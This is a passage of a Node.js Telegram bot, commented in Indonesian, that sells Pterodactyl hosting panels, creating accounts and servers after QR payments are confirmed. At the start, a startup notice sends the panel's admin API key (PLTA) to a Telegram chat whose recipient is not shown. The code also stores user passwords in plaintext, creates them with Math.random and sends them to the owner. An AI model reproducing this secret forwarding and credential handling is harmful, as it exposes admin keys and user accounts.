`<b>🌐 Domain:</b> <code>${config.DOMAIN}</code>\n` +
`<b>🔑 PLTA:</b> <code>${config.PLTA}</code>\n` +
`<b>🤖 Bot:</b> ${settings.BOT_NAME || 'Novabot'}\n` +
`<b>⚡ Versi:</b> ${settings.VERSI || '1.0'}\n\n` +
`<i>Bot berhasil dijalankan!</i>`;
const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
const response = await fetch(url, {
method: 'POST',
headers: {
'Content-Type': 'application/json'
},
body: JSON.stringify({
chat_id: ownerId,
text: message,
parse_mode: 'HTML'
})
});
if (!response.ok) {
throw new Error(`HTTP ${response.status}`);
}
} catch (error) {
console.error('Failed to send startup notification:', error);
}
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🎯 FUNGSI GENERATE PASSWORD DENGAN PANJANG VARIABEL
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function generateRandomPassword(length = 8) {
const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
let password = '';
for (let i = 0; i < length; i++) {
password += chars.charAt(Math.floor(Math.random() * chars.length));
}
return password;
}

function capitalize(string) {
return string.charAt(0).toUpperCase() + string.slice(1).toLowerCase();
}
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🧹 FUNGSI PEMBERSIH USERNAME - DIPERBAIKI
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function cleanUsernameForEmail(username) {
let cleaned = username.replace(/^@+/, '');
cleaned = cleaned.replace(/[^a-zA-Z0-9._]/g, '');
cleaned = cleaned.replace(/\.+/g, '.');
cleaned = cleaned.replace(/^\.+|\.+$/g, '');
if (!cleaned || cleaned.length < 3) {
const randomNum = Math.floor(Math.random() * 10000);
cleaned = 'user' + randomNum;
}
if (cleaned.length > 30) {
cleaned = cleaned.substring(0, 30);
}
return cleaned.toLowerCase();
}
function isValidEmail(email) {
const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
return emailRegex.test(email);
}
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🖥️ CREATE PTERODACTYL USER - SISTEM PENYIMPANAN EMAIL DIPERBAIKI
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function createPterodactylUser(username, email, password, telegramId, isRootAdmin = false, isAdminPanel = false) {
try {
if (!isValidEmail(email)) {
throw new Error(`Email '${email}' tidak valid. Format email harus benar.`);
}
const emails = loadEmails();
let existingUserId = null;
for (const storedEmail in emails) {
if (emails[storedEmail].username === username && emails[storedEmail].telegramId === telegramId) {
existingUserId = emails[storedEmail].pterodactylUserId;
console.log(`✅ Username ditemukan untuk user ini: ${username} (${telegramId})`);
break;
}
}
if (existingUserId) {
console.log(`✅ Menggunakan user yang sudah ada: ${existingUserId}`);
return { id: existingUserId };
}
const response = await fetch(`${config.DOMAIN}/api/application/users`, {
method: 'POST',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${config.PLTA}`
},
body: JSON.stringify({
email: email,
username: username,
first_name: username,
last_name: username,
language: 'en',
password: password,
root_admin: isRootAdmin
})
});
const data = await response.json();
if (data.errors) {
if (data.errors[0].detail && data.errors[0].detail.includes('already been taken')) {
if (isAdminPanel) {
throw new Error(`Username '${username}' sudah digunakan. Silakan gunakan nama lain.`);
}
for (const storedEmail in emails) {
if (emails[storedEmail].username === username) {
console.log(`🔄 Username ditemukan di database, menggunakan email: ${storedEmail}`);
emails[storedEmail].telegramId = telegramId;
saveEmails(emails);
return { id: emails[storedEmail].pterodactylUserId };
}
}
const timestamp = Date.now().toString().slice(-6);
const newEmail = `${username}${timestamp}@nation.id`;
console.log(`🔄 Membuat email baru: ${newEmail}`);
return await createPterodactylUser(username, newEmail, password, telegramId, isRootAdmin, false);
}
throw new Error(data.errors[0].detail);
}
emails[email] = {
telegramId: telegramId,
pterodactylUserId: data.attributes.id,
username: username,
password: password,
createdAt: new Date().toISOString(),
servers: [],
isAdminPanel: isAdminPanel || false
};
saveEmails(emails);
console.log(`✅ User berhasil dibuat dan disimpan: ${username} (${email})`);
return data.attributes;
} catch (error) {
console.error('❌ Error creating Pterodactyl user:', error);
logError('PTERODACTYL_USER_ERROR', `Username: ${username}, Email: ${email}, Error: ${error.message}`);
throw error;
}
}
async function checkExistingEmail(email) {
const emails = loadEmails();
return emails[email];
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🖥️ CREATE PTERODACTYL SERVER - SISTEM PENAMBAHAN SERVER DIPERBAIKI
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function createPterodactylServer(userId, panelType, username, serverName = null) {
try {
let ram, disk, cpu;
if (panelType === 'unli' || panelType === 'unlimited') {
ram = 0;
disk = 0;
cpu = 0;
} else {
switch (panelType) {
case '1gb': ram = 1024; disk = 1024; cpu = 40; break;
case '2gb': ram = 2048; disk = 2048; cpu = 60; break;
case '3gb': ram = 3072; disk = 3072; cpu = 80; break;
case '4gb': ram = 4096; disk = 4096; cpu = 100; break;
case '5gb': ram = 5120; disk = 5120; cpu = 120; break;
case '6gb': ram = 6144; disk = 6144; cpu = 140; break;
case '7gb': ram = 7168; disk = 7168; cpu = 160; break;
case '8gb': ram = 8192; disk = 8192; cpu = 180; break;
case '9gb': ram = 9216; disk = 9216; cpu = 200; break;
case '10gb': ram = 10240; disk = 10240; cpu = 220; break;
default: ram = 1024; disk = 1024; cpu = 40;
}
}
const emails = loadEmails();
let serverCount = 1;
for (const email in emails) {
if (emails[email].pterodactylUserId === userId) {
if (emails[email].servers && emails[email].servers.length > 0) {
serverCount = emails[email].servers.length + 1;
}
break;
}
}
const safeServerName = escapeHTML(serverName || (panelType === 'unli' || panelType === 'unlimited' 
? `${capitalize(username)} UNLI Server #${serverCount}`
: `${capitalize(username)} ${panelType.toUpperCase()} Server #${serverCount}`));
const serverResponse = await fetch(`${config.DOMAIN}/api/application/servers`, {
method: 'POST',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${config.PLTA}`
},
body: JSON.stringify({
name: safeServerName,
description: '',
user: userId,
egg: parseInt(config.EGG),
docker_image: 'ghcr.io/parkervcp/yolks:nodejs_20',
startup: 'npm install && npm start',
environment: {
INST: 'npm',
USER_UPLOAD: '0',
AUTO_UPDATE: '0',
CMD_RUN: 'npm start'
},
limits: {
memory: parseInt(ram),
swap: 0,
disk: parseInt(disk),
io: 500,
cpu: parseInt(cpu)
},
feature_limits: {
databases: 5,
backups: 5,
allocations: 1
},
deploy: {
locations: [parseInt(config.LOX)],
dedicated_ip: false,
port_range: []
}
})
});
const serverData = await serverResponse.json();
if (serverData.errors) {
if (serverData.errors[0].detail && serverData.errors[0].detail.includes('Too Many Attempts')) {
await new Promise(resolve => setTimeout(resolve, 5000));
const retryResponse = await fetch(`${config.DOMAIN}/api/application/servers`, {
method: 'POST',
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${config.PLTA}`
},
body: JSON.stringify({
name: safeServerName,
description: '',
user: userId,
egg: parseInt(config.EGG),
docker_image: 'ghcr.io/parkervcp/yolks:nodejs_20',
startup: 'npm install && npm start',
environment: {
INST: 'npm',
USER_UPLOAD: '0',
AUTO_UPDATE: '0',
CMD_RUN: 'npm start'
},
limits: {
memory: parseInt(ram),
swap: 0,
disk: parseInt(disk),
io: 500,
cpu: parseInt(cpu)
},
feature_limits: {
databases: 5,
backups: 5,
allocations: 1
},
deploy: {
locations: [parseInt(config.LOX)],
dedicated_ip: false,
port_range: []
}
})
});
const retryData = await retryResponse.json();
if (retryData.errors) {
throw new Error(retryData.errors[0].detail);
}
Object.assign(serverData, retryData);
} else {
throw new Error(serverData.errors[0].detail);
}
}
for (const email in emails) {
if (emails[email].pterodactylUserId === userId) {
if (!emails[email].servers) {
emails[email].servers = [];
}
emails[email].servers.push({
serverId: serverData.attributes.id,
name: safeServerName,
panelType: panelType,
createdAt: new Date().toISOString()
});
saveEmails(emails);
console.log(`✅ Server berhasil ditambahkan ke akun: ${username}`);
break;
}
}
return {
server: serverData.attributes,
ram: ram,
disk: disk,
cpu: cpu
};
} catch (error) {
console.error('Error creating Pterodactyl server:', error);
logError('PTERODACTYL_SERVER_ERROR', `User ID: ${userId}, Panel: ${panelType}, Error: ${error.message}`);
throw error;
}
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🔄 PAYMENT POLLING SYSTEM - TAMBAHKAN LOGIKA SELLER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function startPaymentPolling(orderId, chatId, userId, amount, panelType, username, targetId, qrMessageId, isSeller = false) {
let attempts = 0;
const maxAttempts = 60;
let isCancelled = false;
let isCompleted = false;
let lastStatus = 'MENUNGGU PEMBAYARAN';
const statusEmojis = ['⏳', '🔄', '📊', '⚡', '✅'];
let emojiIndex = 0;

const pollingInterval = setInterval(async () => {
if (isCancelled) {
clearInterval(pollingInterval);
return;
}

if (attempts >= maxAttempts) {
clearInterval(pollingInterval);
const transactions = loadTransactions();
if (transactions[orderId]) {
transactions[orderId].status = 'timeout';
saveTransactions(transactions);
}
try {
await bot.editMessageCaption(
`<blockquote>⚠️ Payment Timeout</blockquote>\n\n` +
`Pembayaran belum selesai setelah 5 menit.\n` +
`Order ID: <code>${orderId}</code>\n` +
`Amount: Rp ${amount.toLocaleString()}\n` +
`Status: DIBATALKAN OTOMATIS\n\n` +
`<i>Silakan ulangi proses pembayaran jika masih ingin melanjutkan.</i>`,
{
chat_id: chatId,
message_id: qrMessageId,
parse_mode: 'HTML'
}
);
} catch (error) {
console.error('Error updating timeout message:', error);
}
return;
}

attempts++;
emojiIndex = (emojiIndex + 1) % statusEmojis.length;
const statusEmoji = statusEmojis[emojiIndex];

const statusData = await checkPaymentStatus(orderId);
let statusText = 'MENUNGGU PEMBAYARAN';
let isPaid = false;

if (statusData && statusData.success) {
const status = (statusData.status || '').toString().toUpperCase();
if (status.includes('SUCCESS') || status.includes('COMPLETED') || status.includes('BERHASIL') || status.includes('PAID')) {
statusText = '✅ BERHASIL';
lastStatus = statusText;
isPaid = true;
isCompleted = true;
} else if (status.includes('FAILED') || status.includes('EXPIRED') || status.includes('GAGAL') || status.includes('CANCELLED')) {
statusText = '❌ GAGAL';
lastStatus = statusText;
} else {
statusText = `${statusEmoji} ${lastStatus}`;
}
} else {
statusText = `${statusEmoji} ${lastStatus}`;
}

const minutesPassed = Math.floor(attempts * 5 / 60);
const secondsPassed = (attempts * 5 % 60).toString().padStart(2, '0');
const progressPercent = Math.floor(attempts/maxAttempts*100);
const progressBarFilled = Math.floor(progressPercent / 10);
const progressBarEmpty = 10 - progressBarFilled;

try {
let caption = '';
if (isSeller) {
caption = `<blockquote>💰 PEMBAYARAN SELLER PANEL</blockquote>
<b>Status :</b> ${statusText}
<b>Paket :</b> SELLER
<b>Harga :</b> Rp ${amount.toLocaleString()}
<b>Order ID :</b> <code>${orderId}</code>
<b>Target ID :</b> <code>${targetId}</code>
<b>Waktu :</b> ${minutesPassed}:${secondsPassed} menit
<b>Progress :</b> [${'█'.repeat(progressBarFilled)}${'░'.repeat(progressBarEmpty)}] ${progressPercent}%`;
} else {
caption = `<blockquote>( 👤 ) - 情報, ${escapeHTML(username)}</blockquote>
Halo, silakan lakukan pembayaran untuk melanjutkan!

<blockquote><b>Status :</b> ${statusText}
<b>Panel :</b> ${panelType.toUpperCase()}
<b>Harga :</b> Rp ${amount.toLocaleString()}
<b>Order ID :</b> <code>${orderId}</code>
<b>Waktu :</b> ${minutesPassed}:${secondsPassed} menit
<b>Progress :</b> [${'█'.repeat(progressBarFilled)}${'░'.repeat(progressBarEmpty)}] ${progressPercent}%</blockquote>

Silakan ikuti instruksi pembayaran berikut:
<blockquote><b>Instruksi :</b>
1. Scan QR di atas
2. Bayar sesuai harga
3. Sistem otomatis mendeteksi pembayaran
⏳ Batas waktu: 5 menit</blockquote>`;
}

await bot.editMessageCaption(caption, {
chat_id: chatId,
message_id: qrMessageId,
parse_mode: 'HTML',
reply_markup: {
inline_keyboard: isSeller ? [
[
{ text: '🔄 Refresh Status', callback_data: `refresh_${orderId}` },
{ text: '⛔ Batalkan', callback_data: `cancel_seller_${orderId}` }
],
[
{ text: '⿻ ᴄʜᴀᴛ ᴀᴅᴍɪɴ', url: config.URLADMIN }
]
] : [
[
{ text: '🔄 Refresh Status', callback_data: `refresh_${orderId}` },
{ text: '⛔ Batalkan', callback_data: `cancel_${orderId}` }
],
[
{ text: '⿻ ᴄʜᴀᴛ ᴀᴅᴍɪɴ', url: config.URLADMIN }
]
]
}
});
} catch (error) {
if (error.response && error.response.error_code === 400) {
}
}

if (isPaid) {
clearInterval(pollingInterval);
const transactions = loadTransactions();
if (transactions[orderId]) {
transactions[orderId].status = 'completed';
transactions[orderId].completedAt = new Date().toISOString();
saveTransactions(transactions);
}

try {
await bot.editMessageCaption(
`<blockquote>✅ Payment Success!</blockquote>\n\n` +
`Pembayaran berhasil diverifikasi!\n` +
`Order ID: <code>${orderId}</code>\n` +
`Amount: Rp ${amount.toLocaleString()}\n` +
`Status: LUNAS\n\n` +
`<i>${isSeller ? 'Mendaftarkan sebagai seller...' : 'Mempersiapkan panel Anda...'}</i>`,
{
chat_id: chatId,
message_id: qrMessageId,
parse_mode: 'HTML'
}
);

if (isSeller) {
// TAMBAHKAN USER SEBAGAI RESELLER
addReseller(targetId);

// Kirim pesan ke user
const successMessage = `<blockquote>✅ SELAMAT! ANDA SEKARANG SELLER</blockquote>\n\n` +
`Akun Anda telah berhasil diupgrade menjadi seller panel.\n\n` +
`<b>Keuntungan seller:</b>\n` +
`✅ Bisa buat panel gratis tanpa batas\n` +
`✅ Akses semua paket panel\n` +
`✅ Prioritas support premium\n` +
`✅ Bisa buat panel untuk orang lain\n\n` +
`<b>Gunakan perintah:</b>\n` +
`<code>/1gb username,id</code> - Buat panel gratis\n` +
`<code>/unli username,id</code> - Buat panel unli gratis\n\n` +
`Terima kasih telah menjadi seller kami!`;

await bot.sendMessage(targetId, successMessage, { parse_mode: 'HTML' });

// Kirim notifikasi ke admin
const adminMessage = `<blockquote>🆕 SELLER BARU</blockquote>\n\n` +
`<b>User:</b> ${escapeHTML(username)}\n` +
`<b>User ID:</b> <code>${userId}</code>\n` +
`<b>Target ID:</b> <code>${targetId}</code>\n` +
`<b>Order ID:</b> <code>${orderId}</code>\n` +
`<b>Harga:</b> Rp ${amount.toLocaleString()}\n` +
`<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;

await bot.sendMessage(config.OWNER_ID, adminMessage, { parse_mode: 'HTML' });
} else {
await createAndSendPanel(chatId, panelType, username, targetId, orderId, qrMessageId);
}
} catch (error) {
console.error('Error after payment success:', error);
await bot.sendMessage(chatId, 
`<blockquote>⚠️ Error Membuat Panel</blockquote>\n\n` +
`Pembayaran berhasil tetapi terjadi error:\n` +
`<code>${escapeHTML(error.message)}</code>\n\n` +
`Silakan hubungi admin dengan Order ID: <code>${orderId}</code>`,
{ parse_mode: 'HTML' }
);
}
return;
}

if (statusText === '❌ GAGAL') {
clearInterval(pollingInterval);
const transactions = loadTransactions();
if (transactions[orderId]) {
transactions[orderId].status = 'failed';
saveTransactions(transactions);
}
await bot.editMessageCaption(
`<blockquote>❌ Payment Failed</blockquote>\n\n` +
`Pembayaran gagal atau dibatalkan.\n` +
`Order ID: <code>${orderId}</code>\n` +
`Status: GAGAL\n\n` +
`<i>Silakan ulangi proses dari awal jika ingin mencoba lagi.</i>`,
{
chat_id: chatId,
message_id: qrMessageId,
parse_mode: 'HTML'
}
);
return;
}
}, 5000);

global.pollingIntervals = global.pollingIntervals || {};
global.pollingIntervals[orderId] = {
interval: pollingInterval,
isCancelled: false,
chatId: chatId,
messageId: qrMessageId
};

return {
cancel: () => {
isCancelled = true;
clearInterval(pollingInterval);
if (global.pollingIntervals && global.pollingIntervals[orderId]) {
global.pollingIntervals[orderId].isCancelled = true;
}
},
orderId: orderId
};
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🚀 PANEL CREATION AND SENDING - SISTEM DIPERBAIKI
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function createAndSendPanel(chatId, panelType, username, targetId, orderId, qrMessageId = null) {
let processingMsg;
try {
processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Panel Creation</blockquote>\n\n` +
`Memproses pembuatan panel...\n` +
`Type: ${panelType.toUpperCase()}\n` +
`User: ${escapeHTML(username)}\n` +
`Status: ${'🔄'} 0%`,
{ parse_mode: 'HTML' }
);
await updateProgress(processingMsg.message_id, chatId, 10, 'Memeriksa ketersediaan nama...');
const cleanUsername = cleanUsernameForEmail(username);
let email;
if (panelType === 'unli' || panelType === 'unlimited') {
email = `${cleanUsername}@unli.nation.id`;
} else {
email = `${cleanUsername}@nation.id`;
}
if (!isValidEmail(email)) {
console.log(`❌ Email tidak valid: ${email}`);
throw new Error(`Email yang dihasilkan tidak valid. Silakan gunakan nama yang berbeda.`);
}
const emails = loadEmails();
let existingUser = null;
let existingEmailKey = null;
for (const storedEmail in emails) {
if (emails[storedEmail].username === cleanUsername) {
if (emails[storedEmail].telegramId === targetId) {
existingUser = emails[storedEmail];
existingEmailKey = storedEmail;
console.log(`✅ User ditemukan: ${cleanUsername} untuk Telegram ID: ${targetId}`);
break;
} else {
await updateProgress(processingMsg.message_id, chatId, 100, '❌ Nama sudah digunakan!');
await bot.editMessageText(
`<blockquote>⚠️ Nama Sudah Digunakan</blockquote>\n\n` +
`Nama <b>${escapeHTML(username)}</b> sudah digunakan oleh user lain.\n\n` +
`<blockquote><b>📌 SOLUSI:</b></blockquote>\n` +
`1. Gunakan nama yang berbeda\n` +
`2. Atau hubungi admin jika ini adalah akun Anda\n\n` +
`<i>Silakan ulangi proses pembayaran dengan nama yang berbeda.</i>`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
if (qrMessageId) {
setTimeout(() => {
bot.deleteMessage(chatId, qrMessageId).catch(() => {});
}, 3000);
}
return;
}
}
}
let user;
let password;
let isNewUser = false;
if (existingUser) {
await updateProgress(processingMsg.message_id, chatId, 25, 'Menggunakan akun yang sudah ada...');
user = { id: existingUser.pterodactylUserId };
password = existingUser.password;
email = existingEmailKey; 
console.log(`✅ Menggunakan akun yang sudah ada: ${cleanUsername}`);
} else {
isNewUser = true;
await updateProgress(processingMsg.message_id, chatId, 30, 'Membuat akun user baru...');
password = generateRandomPassword();
try {
user = await createPterodactylUser(cleanUsername, email, password, targetId);
} catch (error) {
if (error.message.includes('already been taken')) {
const timestamp = Date.now().toString().slice(-6);
const newEmail = `${cleanUsername}${timestamp}@nation.id`;
console.log(`🔄 Email ${email} sudah ada, mencoba: ${newEmail}`);
user = await createPterodactylUser(cleanUsername, newEmail, password, targetId);
email = newEmail;
} else {
throw error;
}
}
await updateProgress(processingMsg.message_id, chatId, 50, 'Akun berhasil dibuat!');
console.log(`✅ User berhasil dibuat: ${cleanUsername} (${user.id})`);
}
await updateProgress(processingMsg.message_id, chatId, 60, 'Membuat server baru...');
const serverCount = await getServerCountForUser(user.id);
const serverNumber = serverCount + 1;
const serverName = panelType === 'unli' || panelType === 'unlimited'
? `${capitalize(cleanUsername)} UNLI Server #${serverNumber}`
: `${capitalize(cleanUsername)} ${panelType.toUpperCase()} Server #${serverNumber}`;
console.log(`🖥️ Membuat server: ${serverName}`);
const serverData = await createPterodactylServer(user.id, panelType, cleanUsername, serverName);
await updateProgress(processingMsg.message_id, chatId, 80, 'Server berhasil dibuat!');
console.log(`✅ Server berhasil dibuat: ${serverName}`);
let captionMessage;
if (panelType === 'unli' || panelType === 'unlimited') {
captionMessage = `<blockquote>( 👤 ) - 情報, ${escapeHTML(username)}</blockquote>
Selamat! Panel Unlimited baru berhasil ditambahkan.

<blockquote><b>Status :</b> Aktif
<b>Panel :</b> Unlimited
<b>Email :</b> ${escapeHTML(email)}
<b>User ID :</b> <code>${user.id}</code>
<b>Server :</b> #${serverNumber}
<b>Memory :</b> Unlimited
<b>Disk :</b> Unlimited
<b>CPU :</b> Unlimited</blockquote>

Berikut adalah informasi login panel Anda:
<blockquote><b>Username :</b> <code>${escapeHTML(cleanUsername)}</code>
<b>Password :</b> <code>${password}</code></blockquote>`;
} else {
captionMessage = `<blockquote>( 👤 ) - 情報, ${escapeHTML(username)}</blockquote>
Selamat! Panel ${panelType.toUpperCase()} baru berhasil ditambahkan.

<blockquote><b>Status :</b> Aktif
<b>Panel :</b> ${panelType.toUpperCase()}
<b>Email :</b> ${escapeHTML(email)}
<b>User ID :</b> <code>${user.id}</code>
<b>Server :</b> #${serverNumber}
<b>Memory :</b> ${serverData.ram}MB
<b>Disk :</b> ${serverData.disk}MB
<b>CPU :</b> ${serverData.cpu}%</blockquote>

Berikut adalah informasi login panel Anda:
<blockquote><b>Username :</b> <code>${escapeHTML(cleanUsername)}</code>
<b>Password :</b> <code>${password}</code></blockquote>`;
}
if (isNewUser) {
captionMessage += `\n<blockquote><b>📌 INFO :</b>
• Ini adalah akun baru yang dibuat untuk Anda
• Gunakan email ini untuk login di panel</blockquote>`;
} else {
captionMessage += `\n<blockquote><b>📌 INFO :</b>
• Server baru berhasil ditambahkan ke akun yang sudah ada
• Gunakan email dan password yang sama untuk login</blockquote>`;
}
captionMessage += `
<blockquote><b>📝 Rules :</b>
• Dilarang DDoS Server
• Wajib sensor domain di screenshot
• Admin hanya kirim 1x data
• Jangan bagikan ke orang lain</blockquote>`;
const successKeyboard = {
inline_keyboard: [
[
{ text: '⿻ ʟᴏɢɪɴ ᴘᴀɴᴇʟ', url: config.DOMAIN },
{ text: '⿻ ᴄʜᴀᴛ ᴀᴅᴍɪɴ', url: config.URLADMIN }
]
]
};
try {
console.log(`📤 Mengirim data panel ke user: ${targetId}`);
if (config.PP) {
await bot.sendPhoto(targetId, config.PP, {
caption: captionMessage,
parse_mode: 'HTML',
disable_web_page_preview: true,
reply_markup: successKeyboard
});
} else {
await bot.sendMessage(targetId, captionMessage, {
parse_mode: 'HTML',
disable_web_page_preview: true,
reply_markup: successKeyboard
});
}
await updateProgress(processingMsg.message_id, chatId, 100, '✅ Panel berhasil dikirim ke user!');
const finalMessage = `<blockquote><b>✅ Panel Creation Complete</b></blockquote>\n\n` +
`Type: ${panelType.toUpperCase()}\n` +
`User: ${escapeHTML(username)}\n` +
`Target: <code>${targetId}</code>\n` +
`Status: ${isNewUser ? 'Akun baru dibuat' : 'Server ditambahkan ke akun yang ada'}\n` +
`Username Login: <code>${escapeHTML(cleanUsername)}</code>\n` +
`Email: ${escapeHTML(email)}\n` +
`Password: <code>${password}</code>\n\n` +
`✅ Data berhasil dikirim ke user!`;
await bot.editMessageText(finalMessage, {
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
});
const ownerMsg = `<blockquote>📦 New Panel Created</blockquote>\n\n` +
`<b>📅 Waktu:</b> ${new Date().toLocaleString('id-ID')}\n` +
`<b>👤 Creator:</b> ${chatId}\n` +
`<b>📦 Panel:</b> ${panelType.toUpperCase()}\n` +
`<b>👤 User:</b> ${escapeHTML(username)}\n` +
`<b>🎯 Target ID:</b> <code>${targetId}</code>\n` +
`<b>🆔 User ID Panel:</b> <code>${user.id}</code>\n` +
`<b>📧 Email:</b> ${escapeHTML(email)}\n` +
`<b>🔑 Password:</b> <code>${password}</code>\n` +
`<b>📊 Server:</b> #${serverNumber}\n` +
`<b>📞 Telegram ID:</b> <code>${targetId}</code>\n` +
`<b>✅ Status:</b> ${isNewUser ? 'Akun baru' : 'Server ditambahkan'}\n` +
`<b>💰 Harga:</b> Rp ${calculatePrice(panelType).toLocaleString()}`;

const ownerKeyboard = {
inline_keyboard: [
[
{ text: '💬 Chat User', url: `tg://user?id=${targetId}` }
],
[
{ text: '⿻ ᴄʜᴀᴛ ᴀᴅᴍɪɴ', url: config.URLADMIN }
]
]
};
try {
await bot.sendMessage(config.OWNER_ID, ownerMsg, { 
parse_mode: 'HTML',
reply_markup: ownerKeyboard
});
console.log(`✅ Notifikasi berhasil dikirim ke owner`);
} catch (ownerError) {
console.error(`❌ Gagal mengirim notifikasi ke owner:`, ownerError.message);
}
if (qrMessageId) {
setTimeout(() => {
bot.deleteMessage(chatId, qrMessageId).catch(() => {});
console.log(`🗑️ QR message dihapus: ${qrMessageId}`);
}, 5000);
}
} catch (error) {
console.error('❌ Gagal mengirim data ke user:', error);
await updateProgress(processingMsg.message_id, chatId, 100, '❌ Gagal mengirim ke user!');
let errorMessage = `<blockquote>⚠️ Gagal Mengirim ke Target</blockquote>\n\n`;
errorMessage += `<b>📦 Type:</b> ${panelType.toUpperCase()}\n`;
errorMessage += `<b>👤 User:</b> ${escapeHTML(username)}\n`;
errorMessage += `<b>📧 Email:</b> ${escapeHTML(email)}\n`;
errorMessage += `<b>🔑 Password:</b> <code>${password}</code>\n`;
errorMessage += `<b>👤 Username:</b> <code>${escapeHTML(cleanUsername)}</code>\n`;
errorMessage += `<b>🆔 User ID:</b> <code>${user.id}</code>\n`;
errorMessage += `<b>📊 Server:</b> #${serverNumber}\n\n`;
errorMessage += `<blockquote><b>⚠️ ALASAN GAGAL:</b></blockquote>\n`;
errorMessage += `• ${escapeHTML(error.message)}\n\n`;
errorMessage += `<blockquote><b>📋 DATA PANEL:</b></blockquote>\n`;
errorMessage += `Salin data di bawah dan kirim manual ke user:\n`;
errorMessage += `<code>Username: ${escapeHTML(cleanUsername)}\n`;
errorMessage += `Password: ${password}\n`;
errorMessage += `Email: ${escapeHTML(email)}\n`;
errorMessage += `Login URL: ${escapeHTML(config.DOMAIN)}</code>`;
const failKeyboard = {
inline_keyboard: [
[
{ text: '💬 Chat User', url: `tg://user?id=${targetId}` },
{ text: '📋 Salin Data', callback_data: `copy_${orderId}` }
]
]
};
await bot.editMessageText(errorMessage, {
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML',
disable_web_page_preview: true,
reply_markup: failKeyboard
});
logError('PANEL_SEND_FAILED', `Panel: ${panelType}, User: ${username}, Target: ${targetId}, Error: ${error.message}`);
}
} catch (error) {
console.error('❌ Panel creation error:', error);
logError('PANEL_CREATION_ERROR', `Panel: ${panelType}, User: ${username}, Error: ${error.message}`, chatId, username);
if (processingMsg) {
const errorMessage = `<blockquote><b>❌ Gagal Membuat Panel</b></blockquote>\n\n` +
`Terjadi kesalahan dalam proses pembuatan panel.\n\n` +
`<blockquote><b>Detail Error:</b></blockquote>\n` +
`<code>${escapeHTML(error.message)}</code>\n\n` +
`Silahkan hubungi admin untuk bantuan.`;
await bot.editMessageText(errorMessage, {
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
});
}
}
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🎯 FUNGSI TAMBAHAN UNTUK CEK SERVER COUNT
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function getServerCountForUser(userId) {
try {
const emails = loadEmails();
for (const email in emails) {
if (emails[email].pterodactylUserId === userId) {
return emails[email].servers ? emails[email].servers.length : 0;
}
}
return 0;
} catch (error) {
console.error('Error getting server count:', error);
return 0;
}
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🛡️ ESCAPE HTML FUNCTION UNTUK CEK ERROR
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function escapeHTML(text) {
if (typeof text !== 'string') return text;
return text
.replace(/&/g, '&amp;')
.replace(/</g, '&lt;')
.replace(/>/g, '&gt;')
.replace(/"/g, '&quot;')
.replace(/'/g, '&#039;');
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📊 FUNGSI HELPER UNTUK PROGRESS BAR
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function updateProgress(messageId, chatId, percent, status) {
const progressBar = createProgressBar(percent);
const emoji = getProgressEmoji(percent);
try {
await bot.editMessageText(
`<blockquote>🔄 Panel Creation</blockquote>\n\n` +
`Memproses pembuatan panel...\n\n` +
`${progressBar} ${percent}%\n` +
`Status: ${emoji} ${status}`,
{
chat_id: chatId,
message_id: messageId,
parse_mode: 'HTML'
}
);
} catch (error) {
}
}
function createProgressBar(percent) {
const filled = Math.floor(percent / 10);
const empty = 10 - filled;
return `[${'█'.repeat(filled)}${'░'.repeat(empty)}]`;
}
function getProgressEmoji(percent) {
if (percent < 25) return '🔄';
if (percent < 50) return '⚡';
if (percent < 75) return '📊';
if (percent < 100) return '✅';
return '🎉';
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🖼️ HD IMAGE ENHANCER COMMAND
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function enhanceImage(buffer) {
try {
const form = new FormData();
form.append('method', '1');
form.append('is_pro_version', 'false');
form.append('is_enhancing_more', 'false');
form.append('max_image_size', 'high');
form.append('file', buffer, `enhance_${Date.now()}.jpg`);
const { data } = await axios.post('https://ihancer.com/api/enhance', form, {
headers: form.getHeaders(),
responseType: 'arraybuffer'
});
return Buffer.from(data);
} catch (error) {
throw new Error(error.message);
}
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📤 FITUR TOURL (UPLOAD KE UGUU.SE)
